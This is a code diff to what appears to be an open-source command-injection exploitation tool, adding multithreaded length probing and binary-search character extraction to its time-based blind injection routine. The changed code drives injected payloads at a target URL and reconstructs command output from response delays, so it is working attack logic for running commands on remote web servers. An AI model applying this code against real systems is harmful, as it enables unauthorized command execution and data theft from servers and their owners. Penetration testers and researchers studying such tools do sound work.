@@ -20,6 +20,12 @@ import time
 import json
 import string
 import random
+try:
+  import concurrent.futures
+  _THREADS_SUPPORTED = True
+except ImportError:
+  # "concurrent.futures" needs Python 3.2+; fall back to serial on Python 2.
+  _THREADS_SUPPORTED = False
 from src.utils import menu
 from src.utils import settings
 from src.core.requests import proxy
@@ -32,6 +38,15 @@ from src.thirdparty.six.moves import urllib as _urllib
 from src.thirdparty.six.moves import input as _input
 from src.thirdparty.six.moves import html_parser as _html_parser
 from src.thirdparty.colorama import Fore, Back, Style, init
+
+"""
+Abort a thread pool without waiting for running workers.
+"""
+def _abort_executor(executor, exc):
+  executor.shutdown(wait=False, cancel_futures=True)
+  if isinstance(exc, SystemExit):
+    os._exit(exc.code if isinstance(exc.code, int) else 0)
+  os._exit(130)
 
 """
 The main time-realative command injection exploitation.
@@ -67,34 +82,73 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     info_msg += " (via '" + OUTPUT_TEXTFILE +"')"
   info_msg += "."
   settings.print_data_to_stdout(settings.print_info_msg(info_msg))
-  for output_length in range(int(minlen), int(maxlen)):
+  def _probe_length(candidate):
     if alter_shell:
       if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
+        payload = payloads.cmd_execution_alter_shell(separator, cmd, candidate, timesec, http_request_method)
       else:
-        payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+        payload = payloads.cmd_execution_alter_shell(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
     else:
       if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-        payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
+        payload = payloads.cmd_execution(separator, cmd, candidate, timesec, http_request_method)
       else:
-        payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+        payload = payloads.cmd_execution(separator, cmd, candidate, OUTPUT_TEXTFILE, timesec, http_request_method)
+    exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+    return (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF)
 
-    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
-    injection_check = False
-    if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
-      injection_check = True
-
-    if injection_check == True:
-      if output_length > 1:
-        if settings.VERBOSITY_LEVEL != 0:
-          debug_msg = "Retrieved the length of execution output: " + str(output_length)
-          settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+  output_length = None
+  # Keep length discovery serial for the tempfile-based technique.
+  if settings.THREADS <= 1 or not _THREADS_SUPPORTED or technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
+    for output_length in range(int(minlen), int(maxlen)):
+      if alter_shell:
+        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+          payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
         else:
-          sub_content = "Retrieved: " + str(output_length)
-          settings.print_data_to_stdout(settings.print_sub_content(sub_content))
-      found_chars = True
+          payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+      else:
+        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+          payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
+        else:
+          payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+
+      exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
       injection_check = False
-      break
+      if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
+        injection_check = True
+
+      if injection_check == True:
+        found_chars = True
+        injection_check = False
+        break
+  else:
+    # Confirm a match twice before trusting it.
+    def _confirm_length(candidate):
+      return _probe_length(candidate) and _probe_length(candidate)
+
+    candidates = list(range(int(minlen), int(maxlen)))
+    executor = concurrent.futures.ThreadPoolExecutor(max_workers=settings.THREADS)
+    try:
+      for i in range(0, len(candidates), settings.THREADS):
+        batch = candidates[i:i + settings.THREADS]
+        batch_matches = [c for c, is_match in zip(batch, executor.map(_probe_length, batch)) if is_match]
+        confirmed = [c for c in batch_matches if _confirm_length(c)]
+        if confirmed:
+          output_length = min(confirmed)
+          break
+    except (KeyboardInterrupt, SystemExit) as exc:
+      _abort_executor(executor, exc)
+    else:
+      executor.shutdown(wait=True)
+    if output_length is not None:
+      found_chars = True
+
+  if found_chars == True and output_length > 1:
+    if settings.VERBOSITY_LEVEL != 0:
+      debug_msg = "Retrieved the length of execution output: " + str(output_length)
+      settings.print_data_to_stdout(settings.print_bold_debug_msg(debug_msg))
+    else:
+      sub_content = "Retrieved: " + str(output_length)
+      settings.print_data_to_stdout(settings.print_sub_content(sub_content))
 
   # Proceed with the next (injection) step!
   if found_chars == True :
@@ -117,42 +171,100 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     if output_length > 1:
       settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
       
-    for num_of_chars in range(1, int(num_of_chars)):
+    def _print_progress(progress_num):
+      if settings.VERBOSITY_LEVEL == 0:
+        percent, float_percent = checks.percentage_calculation(progress_num, output_length)
+        if percent == 100:
+          float_percent = settings.info_msg
+        else:
+          float_percent = ".. (" + str(float_percent) + "%)"
+        if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
+          progress_msg = "Presuming the execution output."
+        else:
+          progress_msg = "Retrieving the execution output (via '" + OUTPUT_TEXTFILE + "')."
+        progress_msg += float_percent
+        settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(progress_msg))
+
+    def _bisect_once(num_of_chars, char_pool):
+      # Binary search over the character's ordinal value.
+      min_ord = min(char_pool)
+      max_ord = max(char_pool)
+      lo = min_ord - 1
+      hi = max_ord
+
+      payload = payloads.get_char(separator, cmd, num_of_chars, hi, timesec, http_request_method) if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, hi, timesec, http_request_method)
+      exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+      if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
+        return hi
+
+      while hi - lo > 1:
+        mid = (lo + hi) // 2
+        payload = payloads.get_char(separator, cmd, num_of_chars, mid, timesec, http_request_method) if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, mid, timesec, http_request_method)
+        exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+        if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
+          lo = mid
+        else:
+          hi = mid
+
+      return lo if lo >= min_ord else None
+
+    def _extract_position(num_of_chars):
       char_pool = checks.generate_char_pool(num_of_chars)
-      for ascii_char in char_pool:
-        if alter_shell:
+
+      if alter_shell:
+        # Alternative shells are still experimental.
+        for ascii_char in char_pool:
           if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
             payload = payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
           else:
             payload = payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
-        else:
-          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-            payload = payloads.get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
-          else:
-            payload = payloads.get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
-        exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
-        injection_check = False
-        if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
-          injection_check = True
+          exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
+          if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
+            return num_of_chars, ascii_char
+        return num_of_chars, None
 
-        if injection_check == True:
-          if settings.VERBOSITY_LEVEL == 0:
-            output.append(chr(ascii_char))
-            percent, float_percent = checks.percentage_calculation(num_of_chars, output_length)
-            if percent == 100:
-              float_percent = settings.info_msg
-            else:
-              float_percent = ".. (" + str(float_percent) + "%)"
-            if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-              info_msg = "Presuming the execution output."
-            else:
-              info_msg = "Retrieving the execution output (via '" + OUTPUT_TEXTFILE + "')."
-            info_msg += float_percent
-            settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
-          else:
-            output.append(chr(ascii_char))
-          injection_check = False
-          break
+      if settings.THREADS <= 1:
+        return num_of_chars, _bisect_once(num_of_chars, char_pool)
+
+      # Require two consecutive passes to agree before trusting the result.
+      MAX_ATTEMPTS = 4
+      previous = "unset"
+      for _attempt in range(MAX_ATTEMPTS):
+        result = _bisect_once(num_of_chars, char_pool)
+        if result == previous:
+          return num_of_chars, result
+        previous = result
+      return num_of_chars, previous
+
+    positions = list(range(1, int(num_of_chars)))
+    if settings.THREADS <= 1 or not _THREADS_SUPPORTED:
+      for pos in positions:
+        _, ascii_char = _extract_position(pos)
+        if ascii_char is not None:
+          output.append(chr(ascii_char))
+          _print_progress(pos)
+    else:
+      # Extract positions concurrently.
+      results_by_position = {}
+      completed = 0
+      executor = concurrent.futures.ThreadPoolExecutor(max_workers=settings.THREADS)
+      try:
+        futures = {executor.submit(_extract_position, pos): pos for pos in positions}
+        for future in concurrent.futures.as_completed(futures):
+          pos, ascii_char = future.result()
+          results_by_position[pos] = ascii_char
+          completed += 1
+          if ascii_char is not None:
+            _print_progress(completed)
+      except (KeyboardInterrupt, SystemExit) as exc:
+        _abort_executor(executor, exc)
+      else:
+        executor.shutdown(wait=True)
+      # Assemble in position order.
+      for pos in positions:
+        ascii_char = results_by_position.get(pos)
+        if ascii_char is not None:
+          output.append(chr(ascii_char))
 
     check_end  = time.time()
     check_exec_time = int(check_end - check_start)
@@ -318,9 +430,13 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
       if settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(" (done)")
       return exec_time, output
+    else:
+      checks.unexploitable_point()
+      return exec_time, ""
 
   else:
     checks.unexploitable_point()
+    return exec_time, ""
 
 """
 Prompt the user to confirm or set a custom filename for command execution output.
